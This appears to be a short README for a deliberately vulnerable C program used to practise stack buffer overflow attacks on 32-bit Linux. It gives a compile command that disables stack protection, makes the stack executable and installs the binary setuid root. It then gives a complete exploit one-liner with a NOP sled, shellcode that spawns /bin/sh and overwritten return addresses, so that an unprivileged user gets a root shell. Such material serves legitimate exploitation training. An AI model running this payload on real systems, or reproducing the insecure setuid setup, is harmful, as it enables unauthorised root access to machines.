Vulnerable c program allowing buffer overflow attacks on Linux x86 intel systems

Run following command from root to compile the vulnerable program:
gcc -m32 -mpreferred-stack-boundary=3 -fno-stack-protector -z execstack -o big big.c && clear && chmod u+s big && mv big /usr/bin

Example command to run from non-privileged user toget shell with root privileges:
big `perl -e 'print "\x90"x199 . "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\xbc\xd3\xff\xff" x 39'`
